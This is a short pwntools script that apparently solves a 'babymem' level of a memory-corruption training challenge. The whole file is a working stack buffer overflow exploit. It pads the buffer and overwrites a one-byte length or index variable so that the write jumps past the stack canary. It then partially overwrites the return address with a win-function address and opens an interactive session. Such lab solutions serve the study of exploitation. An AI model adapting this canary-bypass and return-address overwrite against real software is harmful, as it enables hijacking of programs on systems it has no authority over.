from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babymem-level-9-1")
io = elf.process()
WIN = p16(0x1384)

buff_len = 96
return_offset = buff_len + 8
canary = return_offset - 16
N_offset = 72

PAYLOAD = b'A'*(N_offset) + p8(0x67) + WIN #0x67 -> 0x68 -> 104 ret_offset
print(len(PAYLOAD))
with open("test.bin", 'wb') as f:
    f.write(b"26\n")
    f.write(PAYLOAD)
io.sendline(b"106")
io.send(PAYLOAD)
io.interactive()